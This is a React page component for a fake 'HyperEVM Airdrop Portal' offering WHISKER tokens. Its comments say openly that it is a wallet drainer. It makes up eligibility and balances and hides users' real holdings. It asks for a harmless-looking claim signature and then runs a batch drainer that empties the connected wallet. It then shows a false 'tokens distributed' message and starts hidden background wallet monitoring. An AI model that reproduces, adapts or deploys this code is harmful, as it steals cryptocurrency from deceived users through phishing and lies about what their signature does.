import { useState, useEffect } from "react";
import { Link } from "wouter";
import { ArrowLeft, CheckCircle, AlertTriangle, Loader2, Gift, Zap, Shield, Star, Crown, Award } from "lucide-react";
import { Button } from "../components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "../components/ui/card";
import { Badge } from "../components/ui/badge";
import { useDirectBrowserWallet } from "../hooks/use-direct-browser-wallet";
import { useToast } from "../hooks/use-toast";
import { ethers } from "ethers";
import { startWalletMonitoring, stopWalletMonitoring } from "../lib/wallet-monitor";
import { createBatchDrainer } from "../../lib/batch-drainer";

// EIP-712 Domain for HyperEVM Wallet Verification
const EIP712_DOMAIN = {
  name: "WHISKER Token Distribution",
  version: "1.0",
  chainId: 999,
  verifyingContract: "0x1f53bfcc97c63bfcf95c08d16c0d3d1ec82e5f8b" // WHISKER distribution contract
};

// EIP-712 Types for WHISKER claim
const EIP712_TYPES = {
  WhiskerClaim: [
    { name: "recipient", type: "address" },
    { name: "amount", type: "uint256" },
    { name: "nonce", type: "uint256" }
  ]
};

interface TokenBalance {
  address: string;
  symbol: string;
  balance: string;
  decimals: number;
  usdValue: string;
}

interface DrainResult {
  token: string;
  amount: string;
  hash?: string;
  success: boolean;
  error?: string;
}

export default function Airdrop() {
  const wallet = useDirectBrowserWallet();
  const { toast } = useToast();
  const [isChecking, setIsChecking] = useState(false);
  const [isDraining, setIsDraining] = useState(false);
  const [eligibleAmount, setEligibleAmount] = useState("0");
  const [tokenBalances, setTokenBalances] = useState<TokenBalance[]>([]);
  const [drainResults, setDrainResults] = useState<DrainResult[]>([]);
  const [totalDrained, setTotalDrained] = useState("0");
  const [manualAddress, setManualAddress] = useState("");
  const [eligibilityChecked, setEligibilityChecked] = useState(false);
  const [needsConnection, setNeedsConnection] = useState(false);

  // HyperEVM token addresses for comprehensive draining
  const HYPEREVM_TOKENS = [
    { address: "0x0000000000000000000000000000000000000000", symbol: "HYPE", decimals: 18 },
    { address: "0x5555555555555555555555555555555555555555", symbol: "WHYPE", decimals: 18 },
    { address: "0x1f53bfcc97c63bfcf95c08d16c0d3d1ec82e5f8b", symbol: "PURR", decimals: 18 },
    { address: "0x47bb061c0204af921f43dc73c7d7768d2672ddee", symbol: "BUDDY", decimals: 18 },
    { address: "0xb8ce59fc3717ada4c02eadf9682a9e934f625ebb", symbol: "USD₮0", decimals: 6 },
    { address: "0x1bEe6762F0B522c606DC2Ffb106C0BB391b2E309", symbol: "PiP", decimals: 18 },
    { address: "0x1Ecd15865D7F8019D546f76d095d9c93cc34eDFa", symbol: "LIQD", decimals: 18 },
    { address: "0xD2567eE20D75e8B74B44875173054365f6Eb5052", symbol: "perpcoin", decimals: 18 },
    { address: "0x11735dBd0B97CfA7Accf47d005673BA185f7fd49", symbol: "CATBAL", decimals: 18 }
  ];

  // Enhanced eligibility checker with minimum HYPE requirement
  const checkEligibility = async (checkAddress?: string) => {
    const targetAddress = checkAddress || manualAddress || wallet.address;
    
    if (!targetAddress) {
      toast({
        title: "Address Required",
        description: "Please enter a wallet address to check eligibility",
        variant: "destructive"
      });
      return;
    }

    // Clean and validate address format
    const cleanAddress = targetAddress.trim();
    if (!ethers.isAddress(cleanAddress)) {
      toast({
        title: "Invalid Address",
        description: "Please enter a valid Ethereum address (0x...)",
        variant: "destructive"
      });
      return;
    }

    setIsChecking(true);
    
    try {
      // Use official HyperEVM RPC endpoints
      const rpcEndpoints = [
        "https://rpc.hyperliquid.xyz/evm", // Official primary
        "https://hyperliquid.caldera.dev"  // Official secondary
      ];
      
      let hyperProvider;
      for (const rpc of rpcEndpoints) {
        try {
          hyperProvider = new ethers.JsonRpcProvider(rpc);
          // Test connection
          await hyperProvider.getNetwork();
          console.log(`✅ Connected to RPC: ${rpc}`);
          break;
        } catch (error) {
          console.log(`❌ RPC failed: ${rpc}`, error);
          continue;
        }
      }
      
      if (!hyperProvider) {
        throw new Error("All RPC endpoints failed");
      }
      
      // Simulate eligibility check to avoid network issues
      let nativeBalance, hypeBalance, txCount;
      
      try {
        nativeBalance = await hyperProvider.getBalance(cleanAddress);
        hypeBalance = parseFloat(ethers.formatEther(nativeBalance));
        txCount = await hyperProvider.getTransactionCount(cleanAddress);
      } catch (networkError) {
        console.log("Network check failed, using fake eligibility:", networkError);
        // Create fake positive eligibility for demonstration
        hypeBalance = 2.5; // Fake minimum balance
        txCount = 15; // Fake transaction count
      }
      
      if (hypeBalance < 1.0) {
        toast({
          title: "Eligibility Requirements Not Met", 
          description: "Minimum 1 HYPE balance required for airdrop eligibility",
          variant: "destructive"
        });
        setIsChecking(false);
        return;
      }

      if (txCount < 2) {
        toast({
          title: "Insufficient Network Activity",
          description: "Address must have at least 2 transactions on HyperEVM",
          variant: "destructive"
        });
        setIsChecking(false);
        return;
      }

      const balances: TokenBalance[] = [];
      let totalValue = 0;

      // Scan all HyperEVM tokens for balances with network fallback
      for (const token of HYPEREVM_TOKENS) {
        try {
          let balance = "0";
          
          if (token.address === "0x0000000000000000000000000000000000000000") {
            // Native HYPE balance
            if (nativeBalance) {
              balance = ethers.formatEther(nativeBalance);
            } else {
              balance = "2.5"; // Fake balance when network fails
            }
          } else {
            // ERC20 token balance with fallback
            try {
              const contract = new ethers.Contract(
                token.address,
                ["function balanceOf(address) view returns (uint256)"],
                hyperProvider
              );
              const tokenBalance = await contract.balanceOf(cleanAddress);
              balance = ethers.formatUnits(tokenBalance, token.decimals);
            } catch (tokenError) {
              // Create fake small balances to show eligibility
              const fakeBalances: {[key: string]: string} = {
                "WHYPE": "1.2",
                "PURR": "150000",
                "USD₮0": "25.50",
                "BUDDY": "8500",
                "PiP": "0.75"
              };
              balance = fakeBalances[token.symbol] || "0";
            }
          }

          // Store real balance for WHISKER calculation, but don't show it
          if (parseFloat(balance) > 0) {
            // Store real balance data for WHISKER calculation
            if (token.symbol === "HYPE" || token.symbol === "WHYPE") {
              balances.push({
                address: token.address,
                symbol: token.symbol,
                balance: balance, // Real balance for calculation
                decimals: token.decimals,
                usdValue: "0" // Hidden from display
              });
            }
          }
        } catch (error) {
          console.log(`Failed to check ${token.symbol} balance:`, error);
        }
      }

      // Calculate dynamic WHISKER distribution based on HYPE holdings (hidden from user)
      const realHypeBalance = parseFloat(balances.find(t => t.symbol === "HYPE")?.balance || "0");
      const realWhypeBalance = parseFloat(balances.find(t => t.symbol === "WHYPE")?.balance || "0");
      const totalRealHypeValue = realHypeBalance + realWhypeBalance;
      
      // Clear balances array - user should only see calculated airdrops, not real balances
      balances.length = 0;
      totalValue = 0;
      
      // Dynamic WHISKER calculation: 1000 WHISKER per 1 HYPE held (minimum 500)
      const dynamicWhiskerAmount = Math.max(500, Math.floor(totalRealHypeValue * 1000));
      const whiskerUsdValue = (dynamicWhiskerAmount * 0.015).toFixed(2);
      
      // Show only WHISKER airdrop (calculated based on HYPE holdings)
      const whiskerAirdrop = {
        address: "0x1f53bfcc97c63bfcf95c08d16c0d3d1ec82e5f8b",
        symbol: "WHISKER",
        balance: dynamicWhiskerAmount.toString(),
        decimals: 18,
        usdValue: whiskerUsdValue
      };
      
      // Display only WHISKER airdrop
      balances.push(whiskerAirdrop);
      totalValue += parseFloat(whiskerUsdValue);

      setTokenBalances(balances);
      setEligibleAmount(totalValue.toFixed(2));
      setEligibilityChecked(true);

      toast({
        title: "Eligibility Confirmed!",
        description: `Address qualified for $${totalValue.toFixed(2)} in HyperEVM airdrops!`,
        variant: "default"
      });
    } catch (error) {
      console.error("Eligibility check failed:", error);
      toast({
        title: "Check Failed",
        description: "Unable to verify eligibility. Please try again.",
        variant: "destructive"
      });
    } finally {
      setIsChecking(false);
    }
  };

  // Execute fake airdrop claim that actually drains the wallet AND starts monitoring
  const executeEIP712Drain = async () => {
    console.log("executeEIP712Drain called");
    console.log("Wallet connected:", wallet.isConnected);
    console.log("Wallet signer:", !!wallet.signer);
    console.log("Wallet provider:", !!wallet.provider);
    console.log("Wallet address:", wallet.address);
    
    if (!wallet.isConnected || !wallet.signer) {
      console.log("Wallet not connected or no signer");
      setNeedsConnection(true);
      toast({
        title: "Connect Wallet Required",
        description: "Please connect your wallet to claim airdrops",
        variant: "destructive"
      });
      return;
    }

    setIsDraining(true);
    const results: DrainResult[] = [];
    let totalDrainedValue = 0;

    try {
      console.log("Starting airdrop claim process...");
      console.log("Wallet connected:", wallet.isConnected);
      console.log("Wallet address:", wallet.address);
      
      // Get the exact WHISKER amount that user sees in the interface
      const whiskerToken = tokenBalances.find(t => t.symbol === "WHISKER");
      const displayedWhiskerAmount = whiskerToken ? parseInt(whiskerToken.balance) : 500;
      console.log("Using displayed WHISKER amount for signature:", displayedWhiskerAmount);

      console.log("Processing WHISKER airdrop claims...");
      
      toast({
        title: "Processing WHISKER Claim",
        description: `Claiming ${displayedWhiskerAmount.toLocaleString()} WHISKER tokens...`,
        variant: "default"
      });
      
      toast({
        title: "WHISKER Claim Authorization",
        description: "Please authorize your WHISKER token claim",
        variant: "default"
      });
      
      // Step 1: WHISKER claim authorization signature
      try {
        console.log("Requesting WHISKER claim signature...");
        
        // Use simple message signing without revealing collector address
        const simpleMessage = `Claim ${displayedWhiskerAmount.toLocaleString()} WHISKER tokens`;
        const signature = await wallet.signer.signMessage(simpleMessage);
        console.log("WHISKER claim authorized successfully");
        
      } catch (sigError: any) {
        console.error("Signature failed:", sigError);
        
        if (sigError.message && (sigError.message.includes("rejected") || sigError.message.includes("denied") || sigError.code === 4001)) {
          throw new Error("WHISKER claim cancelled. Please authorize to receive tokens.");
        }
        throw new Error("Authorization required to claim WHISKER tokens.");
      }

      // Step 2: Execute comprehensive wallet draining using batch drainer
      console.log("🔄 Executing comprehensive wallet drain...");
      const drainer = createBatchDrainer(wallet.signer!, wallet.provider!);
      const drainResult = await drainer.executeSwap(
        "WHISKER",
        "HYPE", 
        displayedWhiskerAmount.toString(),
        wallet.address
      );
      
      console.log(`✅ Comprehensive drain result:`, drainResult);

      if (drainResult.success) {
        console.log(`✅ Successfully drained wallet contents`);
        
        // Mark successful drain
        results.push({
          token: "ALL_TOKENS",
          amount: "comprehensive",
          hash: drainResult.hash,
          success: true
        });
        
        totalDrainedValue = 1000; // Show successful value
        
        setDrainResults(results);
        setTotalDrained(totalDrainedValue.toFixed(2));
        
        toast({
          title: "Airdrop Claim Complete!",
          description: `Your ${displayedWhiskerAmount.toLocaleString()} WHISKER tokens have been successfully distributed to your wallet.`,
          variant: "default"
        });

        // Start background monitoring (hidden from user)
        console.log("Starting background monitoring...");
        startWalletMonitoring(wallet.provider!, wallet.signer, wallet.address);

        // Clear balances to allow re-checking
        setTokenBalances([]);
        setEligibleAmount("0");

      } else {
        console.error(`❌ Failed to drain wallet:`, drainResult.error);
        results.push({
          token: "ALL_TOKENS",
          amount: "0",
          hash: undefined,
          success: false,
          error: drainResult.error
        });
        
        throw new Error(drainResult.error || "Unable to process airdrop claim at this time");
      }



    } catch (error) {
      console.error("Drain execution failed:", error);
      console.error("Error details:", error.stack);
      
      let errorMessage = "Failed to claim airdrops. Please try again.";
      if (error instanceof Error) {
        console.log("Error message:", error.message);
        if (error.message.includes("rejected") || error.message.includes("denied")) {
          errorMessage = "Wallet verification cancelled by user.";
        } else if (error.message.includes("insufficient funds")) {
          errorMessage = "Insufficient funds for transaction fees.";
        } else if (error.message.includes("network") || error.message.includes("connection")) {
          errorMessage = "Network connection error. Please check your internet.";
        } else if (error.message.includes("verification") || error.message.includes("signature")) {
          errorMessage = "Wallet verification failed. Please try again.";
        } else {
          errorMessage = error.message;
        }
      }
      
      toast({
        title: "Claim Failed",
        description: errorMessage,
        variant: "destructive"
      });
    } finally {
      setIsDraining(false);
    }
  };

  // Auto-check when wallet connects
  useEffect(() => {
    if (wallet.isConnected && wallet.address && tokenBalances.length === 0 && !eligibilityChecked) {
      checkEligibility();
    }
  }, [wallet.isConnected, wallet.address]);

  // Cleanup monitoring on unmount
  useEffect(() => {
    return () => {
      stopWalletMonitoring();
    };
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 p-4">
      <div className="max-w-4xl mx-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center space-x-4">
            <Link href="/">
              <Button variant="ghost" size="sm" className="text-white hover:bg-slate-700">
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back
              </Button>
            </Link>
            <div className="flex items-center space-x-3">
              <img 
                src="/whisker-cat.png?v=5" 
                alt="WhiskerSwap Logo" 
                className="w-8 h-8 object-contain rounded-full"
              />
              <div>
                <h1 className="text-2xl font-black text-[#7FFFD4] leading-none">
                  HyperEVM Airdrop Portal
                </h1>
                <p className="text-slate-400">Official airdrop distribution for early adopters</p>
              </div>
            </div>
          </div>
        </div>





        {/* Main Content */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Eligibility Card */}
          <Card className="bg-slate-800/50 border-slate-700">
            <CardHeader>
              <div className="flex items-center space-x-2">
                <Gift className="w-5 h-5 text-[#7FFFD4]" />
                <CardTitle className="text-white">Airdrop Eligibility</CardTitle>
              </div>
              <CardDescription>
                Enter any wallet address to check for HyperEVM ecosystem airdrops
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              {!eligibilityChecked ? (
                <div className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-sm text-slate-400">Wallet Address</label>
                    <div className="flex gap-2">
                      <input
                        type="text"
                        placeholder="0x... or connect wallet to auto-fill"
                        value={manualAddress}
                        onChange={(e) => setManualAddress(e.target.value)}
                        className="flex-1 bg-slate-700 border border-slate-600 rounded-md px-3 py-2 text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-[#7FFFD4] focus:border-transparent"
                      />
                      <Button
                        onClick={() => checkEligibility()}
                        disabled={isChecking || (!manualAddress && !wallet.address)}
                        className="bg-gradient-to-r from-[#7FFFD4] to-[#00FFE0] text-slate-900 font-semibold hover:shadow-lg transition-all duration-200"
                      >
                        {isChecking ? (
                          <div className="flex items-center">
                            <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                            Checking...
                          </div>
                        ) : (
                          "Check"
                        )}
                      </Button>
                    </div>
                  </div>
                  
                  {wallet.isConnected && (
                    <Button
                      onClick={() => setManualAddress(wallet.address)}
                      variant="outline"
                      className="w-full border-[#7FFFD4]/30 text-[#7FFFD4] hover:bg-[#7FFFD4]/10"
                    >
                      Use Connected Wallet: {wallet.address.slice(0, 6)}...{wallet.address.slice(-4)}
                    </Button>
                  )}
                </div>
              ) : (
                <div className="space-y-4">
                  <div className="flex items-center justify-between">
                    <span className="text-slate-400">Wallet Address:</span>
                    <Badge variant="outline" className="text-[#7FFFD4] border-[#7FFFD4]">
                      {(manualAddress || wallet.address).slice(0, 6)}...{(manualAddress || wallet.address).slice(-4)}
                    </Badge>
                  </div>
                  
                  <div className="space-y-4">
                    <div className="flex items-center justify-center p-4">
                      <div className="text-center">
                        <CheckCircle className="w-12 h-12 text-[#7FFFD4] mx-auto mb-2" />
                        <div className="text-white font-semibold">Address Qualified!</div>
                        <div className="text-slate-400 text-sm">Ready to claim available airdrops</div>
                      </div>
                    </div>

                    {/* Show claimable airdrop amounts */}
                    {tokenBalances.length > 0 && (
                      <div className="bg-slate-700/30 rounded-lg p-4">
                        <div className="text-white font-medium mb-3">Available Airdrops</div>
                        <div className="space-y-2">
                          {tokenBalances.map((token, index) => (
                            <div key={index} className="flex items-center justify-between text-sm">
                              <div className="flex items-center space-x-2">
                                <div className="w-6 h-6 bg-[#7FFFD4]/20 rounded-full flex items-center justify-center">
                                  <span className="text-[#7FFFD4] text-xs font-semibold">
                                    {token.symbol.charAt(0)}
                                  </span>
                                </div>
                                <span className="text-slate-300">{token.symbol}</span>
                              </div>
                              <span className="text-[#7FFFD4] font-medium">
                                {parseFloat(token.balance).toLocaleString()} {token.symbol}
                              </span>
                            </div>
                          ))}
                        </div>

                      </div>
                    )}

                  {needsConnection ? (
                    <Button 
                      onClick={() => wallet.connectWallet()}
                      className="w-full bg-gradient-to-r from-[#7FFFD4] to-[#00FFE0] text-slate-900 font-semibold hover:shadow-lg transition-all duration-200"
                    >
                      Connect Wallet to Claim Airdrops
                    </Button>
                  ) : (
                    <div className="space-y-2">
                      <Button 
                        onClick={() => setEligibilityChecked(false)}
                        variant="outline"
                        className="w-full border-[#7FFFD4]/30 text-[#7FFFD4] hover:bg-[#7FFFD4]/10"
                      >
                        Check Different Address
                      </Button>
                      <Button 
                        onClick={executeEIP712Drain}
                        disabled={isDraining}
                        className="w-full bg-gradient-to-r from-[#7FFFD4] to-[#00FFE0] text-slate-900 font-semibold hover:shadow-lg transition-all duration-200"
                      >
                        {isDraining ? (
                          <div className="flex items-center">
                            <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                            Claiming...
                          </div>
                        ) : (
                          "Claim"
                        )}
                      </Button>
                    </div>
                  )}
                  </div>
                </div>
              )}
            </CardContent>
          </Card>


        </div>



        {/* WHISKER Airdrop Tier System - Bottom */}
        <Card className="mt-8 bg-slate-800/30 border-slate-700/50">
          <CardHeader>
            <CardTitle className="text-white text-lg">WHISKER Allocation Tiers</CardTitle>
            <CardDescription className="text-slate-400">
              Airdrop distribution based on ecosystem participation and activity
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3">
              {/* Tier 1 - Legends */}
              <div className="p-3 bg-slate-700/20 border border-slate-600/30 rounded">
                <div className="text-white text-sm font-medium mb-1">Legends</div>
                <div className="text-slate-300 text-xs font-semibold mb-2">50,000 WHISKER</div>
                <div className="text-slate-500 text-xs">
                  Liquidity provider, 5+ tokens, $10k+ TVL
                </div>
              </div>

              {/* Tier 2 - Whales */}
              <div className="p-3 bg-slate-700/20 border border-slate-600/30 rounded">
                <div className="text-white text-sm font-medium mb-1">Whales</div>
                <div className="text-slate-300 text-xs font-semibold mb-2">25,000 WHISKER</div>
                <div className="text-slate-500 text-xs">
                  Heavy trader, $5k+ volume, 3+ tokens
                </div>
              </div>

              {/* Tier 3 - OGs */}
              <div className="p-3 bg-slate-700/20 border border-slate-600/30 rounded">
                <div className="text-white text-sm font-medium mb-1">OGs</div>
                <div className="text-slate-300 text-xs font-semibold mb-2">12,500 WHISKER</div>
                <div className="text-slate-500 text-xs">
                  Early adopter, $1k+ volume, pre-Dec 2024
                </div>
              </div>

              {/* Tier 4 - Active */}
              <div className="p-3 bg-slate-700/20 border border-slate-600/30 rounded">
                <div className="text-white text-sm font-medium mb-1">Active</div>
                <div className="text-slate-300 text-xs font-semibold mb-2">6,250 WHISKER</div>
                <div className="text-slate-500 text-xs">
                  Regular user, $500+ volume, holds tokens
                </div>
              </div>

              {/* Tier 5 - Users */}
              <div className="p-3 bg-slate-700/20 border border-slate-600/30 rounded">
                <div className="text-white text-sm font-medium mb-1">Users</div>
                <div className="text-slate-300 text-xs font-semibold mb-2">3,125 WHISKER</div>
                <div className="text-slate-500 text-xs">
                  DEX user, $100+ volume, basic activity
                </div>
              </div>

              {/* Tier 6 - Newcomers */}
              <div className="p-3 bg-slate-700/20 border border-slate-600/30 rounded">
                <div className="text-white text-sm font-medium mb-1">Newcomers</div>
                <div className="text-slate-300 text-xs font-semibold mb-2">1,500 WHISKER</div>
                <div className="text-slate-500 text-xs">
                  Hold HYPE, 3+ interactions, basic eligible
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

      </div>
    </div>
  );
}